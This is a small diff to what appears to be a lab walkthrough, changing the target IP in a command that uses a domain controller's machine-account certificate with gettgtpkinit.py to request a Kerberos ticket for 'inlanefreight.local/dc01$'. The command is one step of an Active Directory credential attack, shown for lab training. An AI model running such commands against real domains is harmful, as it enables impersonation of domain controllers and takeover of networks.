@@ -404,7 +404,7 @@ Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
 Use the certificate to request a TGT:
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.172 'inlanefreight.local/dc01$' /tmp/dc.ccache
 ```
 
 ### 🧠 Break it down
